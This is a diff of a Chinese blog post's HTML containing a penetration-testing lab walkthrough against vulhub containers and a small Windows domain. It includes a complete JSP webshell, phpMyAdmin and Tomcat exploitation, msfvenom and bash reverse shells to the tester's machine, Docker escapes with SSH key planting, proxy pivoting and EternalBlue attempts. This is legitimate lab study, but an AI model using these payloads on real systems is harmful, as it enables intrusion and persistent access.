@@ -328,25 +328,30 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">外网使用NAT模式  内网使用VM3 192.168.181.0/24</span><br><span class="line">Ubuntu(ubuntu)      192.168.183.129     192.168.0.180 </span><br><span class="line">DC(Dotest123)       192.168.183.130</span><br><span class="line">Win7(Test2021)      192.168.183.128</span><br></pre></td></tr></table></figure>
-
+        <h3 id="环境搭建">环境搭建</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">外网使用NAT模式  内网使用VM3 192.168.181.0/24</span><br><span class="line">Ubuntu(ubuntu)      192.168.183.129     192.168.0.180 </span><br><span class="line">DC(Dotest123)       192.168.183.130</span><br><span class="line">Win7(Test2021)      192.168.183.128</span><br></pre></td></tr></table></figure>
 <p>开启web机器(ubuntu)的dokcer容器</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cd /home/ubuntu/Desktop/vulhub/struts2/s2-045</span><br><span class="line">sudo docker-compose up -d</span><br><span class="line">cd /home/ubuntu/Desktop/vulhub/tomcat/CVE-2017-12615/</span><br><span class="line">sudo docker-compose up -d</span><br><span class="line">cd /home/ubuntu/Desktop/vulhub/phpmyadmin/CVE-2018-12613/</span><br><span class="line">sudo docker-compose up -d</span><br><span class="line"></span><br><span class="line">sudo docker ps  </span><br></pre></td></tr></table></figure>
-
-<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><p><code>sudo nmap 192.168.0.180 -sT -Pn -sV </code></p>
+<h3 id="信息收集">信息收集</h3>
+<h4 id="端口扫描">端口扫描</h4>
+<p><code>sudo nmap 192.168.0.180 -sT -Pn -sV</code></p>
 <p><img src="/posts/e94e95f1/namp.png"></p>
 <p>开放了 22 2001 2002 2003 端口</p>
 <p>分别访问了下2001，2002，2003端口</p>
-<p>2001    structs2</p>
-<p>2002    tomcat</p>
-<p>2003    phpmyadmin4.8.1</p>
-<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h4 id="phpmyadmin-CVE-2018-12613"><a href="#phpmyadmin-CVE-2018-12613" class="headerlink" title="phpmyadmin CVE-2018-12613"></a>phpmyadmin CVE-2018-12613</h4><p>看了下phpmyadmin的版本 是4.8.1 先验证下是否存在cve-2018-12613</p>
-<p><code>http://192.168.0.128:2003/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd</code> 直接运行了/etc/passwd 说明存在该漏洞</p>
+<p>2001 structs2</p>
+<p>2002 tomcat</p>
+<p>2003 phpmyadmin4.8.1</p>
+<h3 id="漏洞利用">漏洞利用</h3>
+<h4 id="phpmyadmin-cve-2018-12613">phpmyadmin CVE-2018-12613</h4>
+<p>看了下phpmyadmin的版本 是4.8.1 先验证下是否存在cve-2018-12613</p>
+<p><code>http://192.168.0.128:2003/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd</code>
+直接运行了/etc/passwd 说明存在该漏洞</p>
 <p><img src="/posts/e94e95f1/phpmyadmin1.png"></p>
 <p>然后尝试getshell</p>
-<p>在sql处 执行 <code>select &#39;&lt;?php phpinfo();?&gt;&#39;</code></p>
+<p>在sql处 执行 <code>select '&lt;?php phpinfo();?&gt;'</code></p>
 <p><img src="/posts/e94e95f1/phpmyadmin2.png"></p>
-<p>执行成功后查看 自己的sessionid  phpmyadmin的值 <code>2c8e2d642e3762699d4e070db30880b6</code></p>
+<p>执行成功后查看 自己的sessionid phpmyadmin的值
+<code>2c8e2d642e3762699d4e070db30880b6</code></p>
 <p><img src="/posts/e94e95f1/phpmyadmin_value.png"></p>
 <p><code>http://192.168.0.128:2003/index.php?target=db_sql.php%253f/../../../../../../../../tmp/sess_2c8e2d642e3762699d4e070db30880b6</code></p>
 <p><code>http://192.168.0.128:2003/index.php?target=db_sql.php%253f/../../../../../../../../tmp/sess_7f9c04b6ead4e844459d4ec29658e424</code></p>
@@ -355,14 +360,15 @@
 <p>写入一句话</p>
 <p>尝试几个一句话都写入失败了，写入后会报错，可能是因为docker的原因</p>
 <p><img src="/posts/e94e95f1/phpmyadmin_shell_error.png"></p>
-<h4 id="struts2"><a href="#struts2" class="headerlink" title="struts2"></a>struts2</h4><p><img src="/posts/e94e95f1/struts2_1.png"></p>
+<h4 id="struts2">struts2</h4>
+<p><img src="/posts/e94e95f1/struts2_1.png"></p>
 <p><img src="/posts/e94e95f1/struts2_2.PNG"></p>
 <p>可以判断是docker容器</p>
 <p>上传jsp shell</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page import=&quot;java.util.*,java.io.*,java.net.*&quot;%&gt;</span><br><span class="line"> &lt;%</span><br><span class="line"> %&gt;</span><br><span class="line"> &lt;HTML&gt;&lt;BODY&gt;</span><br><span class="line"> &lt;FORM METHOD=&quot;POST&quot; NAME=&quot;myform&quot; ACTION=&quot;&quot;&gt;</span><br><span class="line"> &lt;INPUT TYPE=&quot;text&quot; NAME=&quot;cmd&quot;&gt;</span><br><span class="line"> &lt;INPUT TYPE=&quot;submit&quot; VALUE=&quot;Send&quot;&gt;</span><br><span class="line"> &lt;/FORM&gt;</span><br><span class="line"> &lt;pre&gt;</span><br><span class="line"> &lt;%</span><br><span class="line"> if (request.getParameter(&quot;cmd&quot;) != null) &#123;</span><br><span class="line">    </span><br><span class="line">         out.println(&quot;Command: &quot; + request.getParameter(&quot;cmd&quot;) + &quot;\n&lt;BR&gt;&quot;);</span><br><span class="line">         Process p = Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;));</span><br><span class="line">         OutputStream os = p.getOutputStream();</span><br><span class="line">         InputStream in = p.getInputStream();</span><br><span class="line">         DataInputStream dis = new DataInputStream(in);</span><br><span class="line">         String disr = dis.readLine();</span><br><span class="line">         while ( disr != null ) &#123;</span><br><span class="line">    </span><br><span class="line">                 out.println(disr); disr = dis.readLine(); &#125;</span><br><span class="line">         &#125;</span><br><span class="line"> %&gt;</span><br><span class="line"> &lt;/pre&gt;</span><br><span class="line"> &lt;/BODY&gt;&lt;/HTML&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
 <p><img src="/posts/e94e95f1/struts2_shell.png"></p>
-<h4 id="tomcat"><a href="#tomcat" class="headerlink" title="tomcat"></a>tomcat</h4><p>使用kali的searchsploit搜索tomcat的poc，这里tomcat版本是8.5</p>
+<h4 id="tomcat">tomcat</h4>
+<p>使用kali的searchsploit搜索tomcat的poc，这里tomcat版本是8.5</p>
 <p><code>searchsploit tomcat 8.5.19</code></p>
 <p><img src="/posts/e94e95f1/searchsploit_tomcat.png"></p>
 <p><code>searchsploit -m jsp/webapps/42966.py</code></p>
@@ -370,9 +376,11 @@
 <p><code>sudo python2 42966.pu -u http://192.168.0.180:2002 -p pwn</code></p>
 <p>访问<code>http://192.168.0.180:2002/pwn.jsp</code></p>
 <p><img src="/posts/e94e95f1/tomcat_shell_whoami.png"></p>
-<p>判断是docker环境<code>ls -alh /.dockerenv</code>  <code>cat /proc/1/cgroup</code></p>
-<h4 id="上线msf"><a href="#上线msf" class="headerlink" title="上线msf"></a>上线msf</h4><p>生成msf马</p>
-<p><code> msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.0.128 LPORT=4444 -f elf &gt; shell.elf</code></p>
+<p>判断是docker环境<code>ls -alh /.dockerenv</code>
+<code>cat /proc/1/cgroup</code></p>
+<h4 id="上线msf">上线msf</h4>
+<p>生成msf马</p>
+<p><code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.0.128 LPORT=4444 -f elf &gt; shell.elf</code></p>
 <p>kali开启http服务</p>
 <p><code>sudo python3 -mhttp.server 9999</code></p>
 <p>在上传的pwn.jsp通过wget下载msf</p>
@@ -387,52 +395,57 @@
 <p><code>run</code></p>
 <p>成功反弹到shell</p>
 <p><img src="/posts/e94e95f1/msf_shell.png"></p>
-<h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><h4 id="利用CVE-2019-5736进行docker逃逸"><a href="#利用CVE-2019-5736进行docker逃逸" class="headerlink" title="利用CVE-2019-5736进行docker逃逸"></a>利用CVE-2019-5736进行docker逃逸</h4><p>payload下载地址 <a target="_blank" rel="noopener" href="https://github.com/Frichetten/CVE-2019-5736-PoC">https://github.com/Frichetten/CVE-2019-5736-PoC</a></p>
-<p>下载并编译main,go 修改payload替换为反弹shell </p>
-<p><code>var payload = &quot;#!/bin/bash \n bash -i &gt;&amp; /dev/tcp/192.168.0.128/5555 0&gt;&amp; 1&quot;</code></p>
+<h3 id="权限提升">权限提升</h3>
+<p>#### 利用CVE-2019-5736进行docker逃逸</p>
+<p>payload下载地址 https://github.com/Frichetten/CVE-2019-5736-PoC</p>
+<p>下载并编译main,go 修改payload替换为反弹shell</p>
+<p><code>var payload = "#!/bin/bash \n bash -i &gt;&amp; /dev/tcp/192.168.0.128/5555 0&gt;&amp; 1"</code></p>
 <p>编译生成go文件</p>
-<p><code> CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build main.go</code></p>
+<p><code>CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build main.go</code></p>
 <p>通过msf将生成的main.go上传到靶机</p>
 <p><code>upload ~/桌面/CVE-2019-5736-PoC /home</code></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd /home </span><br><span class="line">chmod /main</span><br><span class="line">cd /main</span><br><span class="line">./main.go</span><br></pre></td></tr></table></figure>
-
 <p>在执行前先在kali上开启监听</p>
 <p><code>nc -lvvp 5555</code></p>
 <p>但是由于需要宿主机执行命令 才能去触发payload反弹shell</p>
-<p>运行完之后 msf进入shell就会卡住…所以就换一种方法 可以使用–privileged（特权模式）进行逃逸</p>
-<h4 id="利用–privileged特权模式逃逸"><a href="#利用–privileged特权模式逃逸" class="headerlink" title="利用–privileged特权模式逃逸"></a>利用–privileged特权模式逃逸</h4><p>使用特权模式向宿主机的硬盘中写入ssh私钥，实现ssh免密登录宿主机</p>
+<p>运行完之后 msf进入shell就会卡住...所以就换一种方法
+可以使用--privileged（特权模式）进行逃逸</p>
+<h4 id="利用privileged特权模式逃逸">利用–privileged特权模式逃逸</h4>
+<p>使用特权模式向宿主机的硬盘中写入ssh私钥，实现ssh免密登录宿主机</p>
 <p>1.查看磁盘文件 <code>fdisk -l</code></p>
 <p><img src="/posts/e94e95f1/docker_fdisk.png"></p>
 <p>2.查看设备文件 <code>ls /dev</code></p>
-<p>3.新建目录进行挂载      <code>mkdir /test</code></p>
-<p>4.将/dev/sda1挂载到/test目录中  <code>mount /dev/sda1 /test</code></p>
+<p>3.新建目录进行挂载 <code>mkdir /test</code></p>
+<p>4.将/dev/sda1挂载到/test目录中 <code>mount /dev/sda1 /test</code></p>
 <p>5.查看是否挂载成功 <code>ls /test</code></p>
 <p><img src="/posts/e94e95f1/mount_test.png"></p>
-<p>6.在kali本地上生成ssh密钥 <code>ssh-keygen -f test</code> ，然后会生成<code>test</code> <code>test.pub</code></p>
+<p>6.在kali本地上生成ssh密钥 <code>ssh-keygen -f test</code>
+，然后会生成<code>test</code> <code>test.pub</code></p>
 <p>赋予600权限<code>chmod 600 test</code></p>
 <p>7.将生成的密钥写入到目标机器中</p>
-<p>由于前面将 <code>sda1</code>挂载到了<code>/test</code> 所以访问/test/home也就等同于去访问宿主机的/home目录</p>
+<p>由于前面将 <code>sda1</code>挂载到了<code>/test</code>
+所以访问/test/home也就等同于去访问宿主机的/home目录</p>
 <p><code>ls /test/home</code></p>
 <p><img src="/posts/e94e95f1/ls_test_home.png"></p>
 <p>查看所有文件<code>ls -alh /test/home/ubuntu</code></p>
 <p><img src="/posts/e94e95f1/ls_test_home_ubuntu.png"></p>
 <p>查看.ssh文件 <code>ls -alh /test/home/ubuntu/.ssh/</code></p>
 <p><img src="/posts/e94e95f1/ls_test_home_ubuntu_ssh.png"></p>
-<p><code>cp -avx /test/home/ubuntu/.ssh/id_rsa.pub /test/home/ubuntu/.ssh/authorized_keys</code> # -avx将权限也一起赋予</p>
+<p><code>cp -avx /test/home/ubuntu/.ssh/id_rsa.pub /test/home/ubuntu/.ssh/authorized_keys</code>
+# -avx将权限也一起赋予</p>
 <p><img src="/posts/e94e95f1/cp_key.png"></p>
 <p><code>echo &gt; /test/home/ubuntu/.ssh/authorized_keys</code></p>
-<p><code>cat test.pub</code> </p>
+<p><code>cat test.pub</code></p>
 <p><code>ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCf0H1/QT12pdJ04TXtsJ8C4n0CCa6l4G4MUpImanHscGsXHz8izRwWoPMuRMwSgnOC1ItEWLCvR1UGxR7VdlBlafxoan9e2nIDtGDth5w4h2aR4ac+HVTZL5mHCcx7frWqZ4sGgeX6SHswNmRqGTS8oleMULqhOvkQlA81ML0mwTgUIKTM4QNBCaB2pyC96LD6OPuO2ofzGbyjEqGuPxpI0dIHxJsL5DvwfKHYSmkuLJA65k0RRHAZrSdBE95NPqrzhgT+u33MTauhmCa2b8+mgX83AOo/mh+Upm+oqqvlkX/1PYvsUkXOpLBm/Oy/ZCWF2aTO+GbHmN2aQK766iChVl0ja04mNnmsaGiUl6MOxqqZ9jqZODpprkfatPuJrzq2Fan4ERlFO3Y7eq/o95qGkKaMdPkHWfiDiag2B+BFS/Xsvr9lKg17xcBG411aAuIhxWQJMHJHjdiM6as8kNbp+JBwU3Kr1M4i3K/Bg3rSlUPD6ibogfIQMTR1Vint2gs= kali@kali2020</code></p>
-<br>
-
-<p><code>echo &#39;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCf0H1/QT12pdJ04TXtsJ8C4n0CCa6l4G4MUpImanHscGsXHz8izRwWoPMuRMwSgnOC1ItEWLCvR1UGxR7VdlBlafxoan9e2nIDtGDth5w4h2aR4ac+HVTZL5mHCcx7frWqZ4sGgeX6SHswNmRqGTS8oleMULqhOvkQlA81ML0mwTgUIKTM4QNBCaB2pyC96LD6OPuO2ofzGbyjEqGuPxpI0dIHxJsL5DvwfKHYSmkuLJA65k0RRHAZrSdBE95NPqrzhgT+u33MTauhmCa2b8+mgX83AOo/mh+Upm+oqqvlkX/1PYvsUkXOpLBm/Oy/ZCWF2aTO+GbHmN2aQK766iChVl0ja04mNnmsaGiUl6MOxqqZ9jqZODpprkfatPuJrzq2Fan4ERlFO3Y7eq/o95qGkKaMdPkHWfiDiag2B+BFS/Xsvr9lKg17xcBG411aAuIhxWQJMHJHjdiM6as8kNbp+JBwU3Kr1M4i3K/Bg3rSlUPD6ibogfIQMTR1Vint2gs= kali@kali2020&#39; &gt;&gt; /test/home/ubuntu/.ssh/authorized_keys    </code># 将ssh秘钥写入authorized_keys文件</p>
+<p><br></p>
+<p><code>echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCf0H1/QT12pdJ04TXtsJ8C4n0CCa6l4G4MUpImanHscGsXHz8izRwWoPMuRMwSgnOC1ItEWLCvR1UGxR7VdlBlafxoan9e2nIDtGDth5w4h2aR4ac+HVTZL5mHCcx7frWqZ4sGgeX6SHswNmRqGTS8oleMULqhOvkQlA81ML0mwTgUIKTM4QNBCaB2pyC96LD6OPuO2ofzGbyjEqGuPxpI0dIHxJsL5DvwfKHYSmkuLJA65k0RRHAZrSdBE95NPqrzhgT+u33MTauhmCa2b8+mgX83AOo/mh+Upm+oqqvlkX/1PYvsUkXOpLBm/Oy/ZCWF2aTO+GbHmN2aQK766iChVl0ja04mNnmsaGiUl6MOxqqZ9jqZODpprkfatPuJrzq2Fan4ERlFO3Y7eq/o95qGkKaMdPkHWfiDiag2B+BFS/Xsvr9lKg17xcBG411aAuIhxWQJMHJHjdiM6as8kNbp+JBwU3Kr1M4i3K/Bg3rSlUPD6ibogfIQMTR1Vint2gs= kali@kali2020' &gt;&gt; /test/home/ubuntu/.ssh/authorized_keys</code>#
+将ssh秘钥写入authorized_keys文件</p>
 <p><img src="/posts/e94e95f1/echo_ssh_rsa.png"></p>
-<p>查看是否写入成功，发现还是没成功，使用<code>echo &gt; /test/home/ubuntu/.ssh/authorized_keys </code>无法清除原有的值，应该是没有写入权限</p>
-<p><code> cat /test/home/ubuntu/.ssh/authorized_keys</code></p>
+<p>查看是否写入成功，发现还是没成功，使用<code>echo &gt; /test/home/ubuntu/.ssh/authorized_keys</code>无法清除原有的值，应该是没有写入权限</p>
+<p><code>cat /test/home/ubuntu/.ssh/authorized_keys</code></p>
 <p><img src="/posts/e94e95f1/cat_ssh_rsa.png"></p>
 <p>尝试去上传一个key.sh，内容如下</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cp -avx /test/home/ubuntu/.ssh/id_rsa.pub /test/home/ubuntu/.ssh/authorized_keys</span><br><span class="line">echo &gt; /test/home/ubuntu/.ssh/authorized_keys</span><br><span class="line">echo &#x27;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCf0H1/QT12pdJ04TXtsJ8C4n0CCa6l4G4MUpImanHscGsXHz8izRwWoPMuRMwSgnOC1ItEWLCvR1UGxR7VdlBlafxoan9e2nIDtGDth5w4h2aR4ac+HVTZL5mHCcx7frWqZ4sGgeX6SHswNmRqGTS8oleMULqhOvkQlA81ML0mwTgUIKTM4QNBCaB2pyC96LD6OPuO2ofzGbyjEqGuPxpI0dIHxJsL5DvwfKHYSmkuLJA65k0RRHAZrSdBE95NPqrzhgT+u33MTauhmCa2b8+mgX83AOo/mh+Upm+oqqvlkX/1PYvsUkXOpLBm/Oy/ZCWF2aTO+GbHmN2aQK766iChVl0ja04mNnmsaGiUl6MOxqqZ9jqZODpprkfatPuJrzq2Fan4ERlFO3Y7eq/o95qGkKaMdPkHWfiDiag2B+BFS/Xsvr9lKg17xcBG411aAuIhxWQJMHJHjdiM6as8kNbp+JBwU3Kr1M4i3K/Bg3rSlUPD6ibogfIQMTR1Vint2gs= kali@kali2020&#x27; &gt; /test/home/ubuntu/.ssh/authorized_keys</span><br><span class="line">cat /test/home/ubuntu/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>
-
 <p>开启http服务使用靶机下载</p>
 <p><code>sudo python3 -m http.server 9999</code></p>
 <p><code>wget http://192.168.0.128:9999</code></p>
@@ -441,40 +454,40 @@
 <p>还是写入失败了，看了下师傅们也是这样做的没啥问题，然后我就去ubuntu靶机上试了下发现也没法使用echo写入，只能通过<code>sudo vim authorized_keys</code>手动将在kali上生成的密钥复制进去，才能在kali上免密登录</p>
 <p><code>ssh -i test ubuntu@192.168.0.181</code></p>
 <p><img src="/posts/e94e95f1/ssh_test_ubuntu.png"></p>
-<h4 id="上线msf-1"><a href="#上线msf-1" class="headerlink" title="上线msf"></a>上线msf</h4><p>然后在msf生成木马，使用python开启gttp服务，下载后连接shell</p>
+<h4 id="上线msf-1">上线msf</h4>
+<p>然后在msf生成木马，使用python开启gttp服务，下载后连接shell</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.0.128 LPORT=8888 -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure>
-
 <p><img src="/posts/e94e95f1/msf_shell2.png"></p>
-<p><code>use exploit/multi/handler </code></p>
-<p> <code>set payload  linux/x86/meterpreter/reverse_tcp</code></p>
+<p><code>use exploit/multi/handler</code></p>
+<p><code>set payload  linux/x86/meterpreter/reverse_tcp</code></p>
 <p>突然不小心把shell.elf断掉了 重新上线了一个 session 12</p>
-<h4 id="添加路由"><a href="#添加路由" class="headerlink" title="添加路由"></a>添加路由</h4><p><code> use post/multi/manage/autoroute</code></p>
+<h4 id="添加路由">添加路由</h4>
+<p><code>use post/multi/manage/autoroute</code></p>
 <p><img src="/posts/e94e95f1/autoroute.png"></p>
 <p><code>route print</code>查看路由</p>
 <p><img src="/posts/e94e95f1/route_print.png"></p>
-<h4 id="设置代理"><a href="#设置代理" class="headerlink" title="设置代理"></a>设置代理</h4><p><code>use auxiliary/server/socks_proxy</code></p>
+<h4 id="设置代理">设置代理</h4>
+<p><code>use auxiliary/server/socks_proxy</code></p>
 <p><img src="/posts/e94e95f1/set_socks_proxy.png"></p>
 <p><code>sudo /etc/proxychains4.conf</code></p>
-<p>修改kali proxychains4.conf配置为<code>socks5 127.0.0.1 1080</code> </p>
-<br>
-
-<h3 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h3><h4 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h4><p>使用smb扫描</p>
+<p>修改kali
+proxychains4.conf配置为<code>socks5 127.0.0.1 1080</code></p>
+<p><br></p>
+<h3 id="内网渗透">内网渗透</h3>
+<h4 id="信息收集-1">信息收集</h4>
+<p>使用smb扫描</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/smb/smb_version</span><br><span class="line">set rhosts 192.168.183.0/24`</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
-
 <p>扫到两台windows机器</p>
 <p><img src="/posts/e94e95f1/smb_scan1.png"></p>
 <p><img src="/posts/e94e95f1/smb_scan2.png"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">192.168.183.130   win2008</span><br><span class="line">192.168.183.148   win7</span><br></pre></td></tr></table></figure>
-
 <p>用ms17-010扫一下</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/smb/smb_ms17_010</span><br><span class="line">set rhosts 192.168.183.130,148</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
-
 <p><img src="/posts/e94e95f1/smb_ms17_010.png"></p>
 <p>两台机器都存在ms17-010漏洞</p>
 <p>使用ms17-010进行攻击</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">setg proxies socks5:127.0.0.1:1080</span><br><span class="line">set rhosts 192.168.183.148</span><br><span class="line">set payload windows/x64/meterpreter/bind_tcp</span><br><span class="line">set lport 4444</span><br><span class="line">set autorunscript post/windows/manage/migrate</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
-
-<p>两台机器都没打通……</p>
+<p>两台机器都没打通......</p>
 <p><img src="/posts/e94e95f1/ms17010_fail.png"></p>
 
     </div>
@@ -605,7 +618,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-number">1.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">2.</span> <span class="nav-text">信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-number">2.1.</span> <span class="nav-text">端口扫描</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">3.</span> <span class="nav-text">漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#phpmyadmin-CVE-2018-12613"><span class="nav-number">3.1.</span> <span class="nav-text">phpmyadmin CVE-2018-12613</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#struts2"><span class="nav-number">3.2.</span> <span class="nav-text">struts2</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#tomcat"><span class="nav-number">3.3.</span> <span class="nav-text">tomcat</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%8A%E7%BA%BFmsf"><span class="nav-number">3.4.</span> <span class="nav-text">上线msf</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="nav-number">4.</span> <span class="nav-text">权限提升</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8CVE-2019-5736%E8%BF%9B%E8%A1%8Cdocker%E9%80%83%E9%80%B8"><span class="nav-number">4.1.</span> <span class="nav-text">利用CVE-2019-5736进行docker逃逸</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E2%80%93privileged%E7%89%B9%E6%9D%83%E6%A8%A1%E5%BC%8F%E9%80%83%E9%80%B8"><span class="nav-number">4.2.</span> <span class="nav-text">利用–privileged特权模式逃逸</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%8A%E7%BA%BFmsf-1"><span class="nav-number">4.3.</span> <span class="nav-text">上线msf</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B7%BB%E5%8A%A0%E8%B7%AF%E7%94%B1"><span class="nav-number">4.4.</span> <span class="nav-text">添加路由</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%AE%BE%E7%BD%AE%E4%BB%A3%E7%90%86"><span class="nav-number">4.5.</span> <span class="nav-text">设置代理</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F"><span class="nav-number">5.</span> <span class="nav-text">内网渗透</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-1"><span class="nav-number">5.1.</span> <span class="nav-text">信息收集</span></a></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-number">1.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">2.</span> <span class="nav-text">信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-number">2.1.</span> <span class="nav-text">端口扫描</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">3.</span> <span class="nav-text">漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#phpmyadmin-cve-2018-12613"><span class="nav-number">3.1.</span> <span class="nav-text">phpmyadmin CVE-2018-12613</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#struts2"><span class="nav-number">3.2.</span> <span class="nav-text">struts2</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#tomcat"><span class="nav-number">3.3.</span> <span class="nav-text">tomcat</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%8A%E7%BA%BFmsf"><span class="nav-number">3.4.</span> <span class="nav-text">上线msf</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="nav-number">4.</span> <span class="nav-text">权限提升</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8privileged%E7%89%B9%E6%9D%83%E6%A8%A1%E5%BC%8F%E9%80%83%E9%80%B8"><span class="nav-number">4.1.</span> <span class="nav-text">利用–privileged特权模式逃逸</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%8A%E7%BA%BFmsf-1"><span class="nav-number">4.2.</span> <span class="nav-text">上线msf</span></a></li><li 